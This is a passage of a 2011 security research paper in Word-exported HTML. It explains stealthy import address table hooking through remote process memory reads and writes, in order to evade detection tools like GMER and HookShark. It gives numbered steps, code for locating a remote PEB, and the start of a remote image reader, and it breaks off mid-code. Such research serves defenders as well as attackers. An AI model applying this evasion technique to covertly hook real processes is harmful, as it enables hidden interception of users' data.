
<!-- saved from url=(0051)https://autosectools.com/IAT-Hooking-Revisited.html -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<meta name="Generator" content="Microsoft Word 12 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
	{font-family:"Cambria Math";
	panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin-top:0in;
	margin-right:0in;
	margin-bottom:10.0pt;
	margin-left:0in;
	line-height:115%;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";}
h1
	{mso-style-link:"Heading 1 Char";
	margin-right:0in;
	margin-left:0in;
	font-size:24.0pt;
	font-family:"Times New Roman","serif";
	font-weight:bold;}
h3
	{mso-style-link:"Heading 3 Char";
	margin-right:0in;
	margin-left:0in;
	font-size:13.5pt;
	font-family:"Times New Roman","serif";
	font-weight:bold;}
a:link, span.MsoHyperlink
	{color:blue;
	text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
	{color:purple;
	text-decoration:underline;}
p
	{margin-right:0in;
	margin-left:0in;
	font-size:12.0pt;
	font-family:"Times New Roman","serif";}
span.Heading1Char
	{mso-style-name:"Heading 1 Char";
	mso-style-link:"Heading 1";
	font-family:"Times New Roman","serif";
	font-weight:bold;}
span.Heading3Char
	{mso-style-name:"Heading 3 Char";
	mso-style-link:"Heading 3";
	font-family:"Times New Roman","serif";
	font-weight:bold;}
span.apple-tab-span
	{mso-style-name:apple-tab-span;}
.MsoPapDefault
	{margin-bottom:10.0pt;
	line-height:115%;}
@page WordSection1
	{size:8.5in 11.0in;
	margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
	{page:WordSection1;}
 /* List Definitions */
 ol
	{margin-bottom:0in;}
ul
	{margin-bottom:0in;}
-->
</style>

<style></style></head>

<body lang="EN-US" link="blue" vlink="purple">

<div class="WordSection1">

<p class="MsoNormal" align="center" style="text-align:center;line-height:normal"><b><span style="font-size:40.0pt;font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">&nbsp;</span></b></p>

<p class="MsoNormal" align="center" style="text-align:center;line-height:normal"><b><span style="font-size:40.0pt;font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">&nbsp;</span></b></p>

<p class="MsoNormal" align="center" style="text-align:center;line-height:normal"><b><span style="font-size:40.0pt;font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">&nbsp;</span></b></p>

<p class="MsoNormal" align="center" style="text-align:center;line-height:normal"><b><span style="font-size:40.0pt;font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">IAT
Hooking Revisited</span></b></p>

<p class="MsoNormal" align="center" style="text-align:center;line-height:normal"><b><span style="font-size:12.0pt;font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">John
Leitch</span></b></p>

<p class="MsoNormal" align="center" style="text-align:center;line-height:normal"><b><span style="font-size:12.0pt;font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">8/1/2011</span></b></p>

<p class="MsoNormal" align="center" style="text-align:center;line-height:normal"><a href="mailto:john@autosectools.com"><b><span style="font-size:12.0pt;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">john@autosectools.com</span></b></a></p>

<p class="MsoNormal" align="center" style="text-align:center;line-height:normal"><a href="http://www.autosectools.com/"><b><span style="font-size:12.0pt;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">http://www.autosectools.com/</span></b></a></p>

<p class="MsoNormal" align="center" style="text-align:center;line-height:normal"><b><span style="font-size:12.0pt;font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">&nbsp;</span></b></p>

<p class="MsoNormal" align="center" style="text-align:center;line-height:normal"><b><span style="font-size:40.0pt;font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">&nbsp;</span></b></p>

<b><span style="font-size:24.0pt;line-height:115%;font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;
color:black"><br clear="all" style="page-break-before:always">
</span></b>

<p class="MsoNormal"><b><span style="font-size:12.0pt;line-height:115%;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">&nbsp;</span></b></p>

<p class="MsoNormal" style="line-height:normal"><b><span style="font-size:14.0pt;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">Introduction </span></b></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">Import
address table (IAT) hooking is a well documented technique for intercepting
calls to imported functions. However, most methods rely on suspicious API
functions and leave several easy to identify artifacts. This paper explores
different ways IAT hooking can be employed while circumventing common detection
mechanisms. </span><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;
color:black"><br>
<br>
</span></p>

<p class="MsoNormal" style="line-height:normal"><b><span style="font-size:14.0pt;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">The Traditional Way</span></b></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">IAT hooking
is usually achieved via DLL injection. When the DLL containing the hooking code
is injected into the target process, it is given access to the process’s memory.
From there it can rewrite the IAT entries, pointing them to handlers within the
DLL. While this works, it is easy to detect. Depending on the approach taken
several different types of artifacts can be left behind such as registry keys
in the hive or threads and modules in memory. Complicating matters further, the
address of the handler points to the injected module rather than the module
exporting the original function. &nbsp;</span><span style="font-size:13.5pt;
font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black"><br>
<br>
</span><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">These traces
do not bode well for covert activities. Modified IAT entries are easy to detect
by verifying that every entry in in the table points to the appropriate module
(or at least to a windows system module). Any malicious modules, once
identified, can easily be dumped from memory for further analysis.</span><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black"><br>
<br>
</span></p>

<p class="MsoNormal" style="line-height:normal"><b><span style="font-size:14.0pt;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">A Different Approach</span></b></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">Many
pitfalls of the DLL injection approach can be avoided by doing away with DLL
injection altogether. This can be accomplished by interacting with the target
process solely using OpenProcess, NtQueryInformationProcess, ReadProcessMemory,
and WriteProcessMemory. While this is quite a bit more work there are a few significant
payoffs:</span></p>

<ol start="1" type="1">
 <li class="MsoNormal" style="color:black;line-height:normal;vertical-align:baseline"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Fewer artifacts (no DLLs written
     to the harddrive, no DLLs in memory, no threads owned by other processes
     etc).</span></li>
 <li class="MsoNormal" style="color:black;line-height:normal;vertical-align:baseline"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Fewer calls to functions that
     might be considered suspicious (VirtualAllocEx, CreateRemoteThread, and
     OpenProcess with PROCESS_CREATE_THREAD).</span></li>
 <li class="MsoNormal" style="color:black;line-height:normal;vertical-align:baseline"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Harder to detect because the hook
     handler is located within the .text section of the import module.</span></li>
</ol>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">While
lengthy and error prone, the steps to accomplish this are straight forward:</span></p>

<ol start="1" type="1">
 <li class="MsoNormal" style="color:black;line-height:normal;vertical-align:baseline"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Open the process with query
     limited and VM operation/read/write rights.</span></li>
 <li class="MsoNormal" style="color:black;line-height:normal;vertical-align:baseline"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Call NtQueryInformationProcess to
     get the Process Enviroment Block (PEB) base of the external process.</span></li>
 <li class="MsoNormal" style="color:black;line-height:normal;vertical-align:baseline"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Read the main image of the
     external process by using the image base from the PEB and
     ReadProcessMemory.</span></li>
 <li class="MsoNormal" style="color:black;line-height:normal;vertical-align:baseline"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Find the target ILT/IAT entry in
     the external process using ReadProcessMemory.</span></li>
 <li class="MsoNormal" style="color:black;line-height:normal;vertical-align:baseline"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Copy the handler function from
     the process performing the hooking to a buffer and patch it with the
     original import address.</span></li>
 <li class="MsoNormal" style="color:black;line-height:normal;vertical-align:baseline"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Write the handler function to the
     .text section of the appropriate import module within the external process
     using WriteProcessMemory.</span></li>
 <li class="MsoNormal" style="color:black;line-height:normal;vertical-align:baseline"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Update the import address using
     WriteProcessMemory.</span></li>
</ol>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">The result
is IAT hooking that is not detected by GMER 1.0.15.15641 or HookShark 0.9. In
this proof of concept we will be hooking the windows calculator import
USER32.dll!GetClipboardData.</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;
color:black">&nbsp;</span></p>

<p class="MsoNormal" style="line-height:normal"><b><span style="font-size:14.0pt;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">Locating The Remote PEB</span></b></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">The easiest
way to locate the PEB of an external process is to call OpenProcess with
PROCESS_QUERY_LIMITED_INFORMATION rights, then pass the process handle and
ProcessBasicInformation (0) to NtQueryInformationProcess.</span><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black"><br>
<br>
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">DWORD</span><span style="font-size:
10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">FindRemotePEB</span>(<span style="color:#010001">HANDLE</span> <span style="color:#010001">hProcess</span>)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">{</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">HMODULE</span> <span style="color:#010001">hNTDLL</span> = <span style="color:#010001">LoadLibraryA</span>(<span style="color:#A31515">"ntdll"</span>);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">if</span> (!<span style="color:#010001">hNTDLL</span>)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">return</span>
0;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">FARPROC</span> <span style="color:#010001">fpNtQueryInformationProcess</span> = <span style="color:#010001">GetProcAddress</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">hNTDLL</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"NtQueryInformationProcess"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; );</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">if</span> (!<span style="color:#010001">fpNtQueryInformationProcess</span>)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">return</span>
0;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">NtQueryInformationProcess</span>
<span style="color:#010001">ntQueryInformationProcess</span> = </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (<span style="color:#010001">NtQueryInformationProcess</span>)<span style="color:#010001">fpNtQueryInformationProcess</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">PROCESS_BASIC_INFORMATION</span>*
<span style="color:#010001">pBasicInfo</span> = </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">new</span> <span style="color:#010001">PROCESS_BASIC_INFORMATION</span>();</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">DWORD</span> <span style="color:#010001">dwReturnLength</span> = 0;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">ntQueryInformationProcess</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">hProcess</span>,
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0, </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pBasicInfo</span>,
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">sizeof</span>(<span style="color:#010001">PROCESS_BASIC_INFORMATION</span>), </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &amp;<span style="color:#010001">dwReturnLength</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; );</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">return</span> <span style="color:#010001">pBasicInfo</span>-&gt;<span style="color:#010001">PebBaseAddress</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9"><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;">}</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;
color:black">&nbsp;</span></p>

<p class="MsoNormal" style="line-height:normal"><b><span style="font-size:14.0pt;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">Reading The Remote Image</span></b></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;
color:black">By passing the ImageBaseAddress member of PEB and ReadRemoteMemory
we can read the image from the external process.</span><span style="font-size:
13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black"><br>
<br>
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">PLOADED_IMAGE</span><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">ReadRemoteImage</span>(<span style="color:#010001">HANDLE</span> <span style="color:#010001">hProcess</span>,
<span style="color:#010001">LPCVOID</span> <span style="color:#010001">lpImageBaseAddress</span>)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">{</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">BYTE</span>* <span style="color:#010001">lpBuffer</span> = <span style="color:blue">new</span> <span style="color:#010001">BYTE</span>[<span style="color:#010001">BUFFER_SIZE</span>];</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">BOOL</span> <span style="color:#010001">bSuccess</span> = <span style="color:#010001">ReadProcessMemory</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">hProcess</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">lpImageBaseAddress</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">lpBuffer</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">BUFFER_SIZE</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; );</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">if</span> (!<span style="color:#010001">bSuccess</span>)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">return</span>
0;&nbsp;&nbsp; </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">PIMAGE_DOS_HEADER</span>
<span style="color:#010001">pDOSHeader</span> = (<span style="color:#010001">PIMAGE_DOS_HEADER</span>)<span style="color:#010001">lpBuffer</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">PLOADED_IMAGE</span>
<span style="color:#010001">pImage</span> = <span style="color:blue">new</span>
<span style="color:#010001">LOADED_IMAGE</span>();</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pImage</span>-&gt;<span style="color:#010001">FileHeader</span> = </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (<span style="color:#010001">PIMAGE_NT_HEADERS32</span>)(<span style="color:#010001">lpBuffer</span> + <span style="color:#010001">pDOSHeader</span>-&gt;<span style="color:#010001">e_lfanew</span>);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
